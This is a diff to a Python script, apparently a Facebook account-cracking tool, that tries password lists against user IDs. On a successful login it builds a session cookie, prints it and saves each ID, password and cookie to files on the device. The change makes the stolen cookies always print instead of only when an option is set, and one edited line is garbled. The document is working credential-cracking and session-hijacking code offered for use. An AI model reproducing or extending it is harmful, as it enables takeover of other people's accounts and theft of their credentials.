@@ -731,9 +731,7 @@ def M1(ids,names,passlist):
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                         print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        if 'y' in pcookie:
-                                        	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
-                                        continue
+                                        print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                         open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
@@ -832,10 +830,7 @@ def M2(ids,names,passlist):
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                         print('\r\r\033[1;32m [print("\033[1;32m NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        if 'y' in pcookie:
-                                        	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
-                                        else:
-                                        	continue
+                                        print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                         open('/sdcard/NEWTON_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
@@ -935,10 +930,7 @@ def M3(ids,names,passlist):
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                         print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                         print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        if 'y' in pcookie:
-                                        	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
-                                        else:
-                                        	continue
+                                        print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                         open('/sdcard/NEWTON_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
